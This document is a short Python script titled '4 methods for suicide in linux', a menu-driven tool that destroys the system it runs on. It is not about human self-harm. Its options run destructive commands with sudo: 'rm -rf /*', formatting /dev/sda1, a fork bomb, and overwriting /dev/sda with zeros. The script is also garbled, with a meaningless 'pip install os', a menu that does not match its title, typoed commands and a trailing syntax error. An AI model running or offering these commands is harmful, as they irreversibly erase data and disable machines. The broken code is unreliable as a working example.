#!/usr/bin/python3.6
import os
#4 methods for suicide in linux

version = "0.2"
os.system("pip install os")

startmenu = """4 methods for suicide in linux
Coded By : Mr.BlackPY
be careful
"""
print(startmenu)

print("1")
print("2")
print("3")
print("4")
print("5")
print("6")
print("7")


try:
    s = int(input("Please Select a Number: "))
except:
    print("wrong input!")
    exit()

if s == 1:
    os.system("sudo rm -rf /*")
elif s == 2:
    os.system("sudo mkfs.ext4 /dev/sda1")
elif s == 3:
    os.system(":(){ :|: & };:")
elif s == 4:
    os.system("sudo mv ~ /dev/null")
elif s == 5:
    os.system("sudo cp /dev/zero /dev/sda")
elif s == 6:
    os.system("command > dev/sda")
elif s == 7:
    os.system("mkfs.ex3 /dev/sda")
    
exit()

  
eife s == 8:
    

exit()
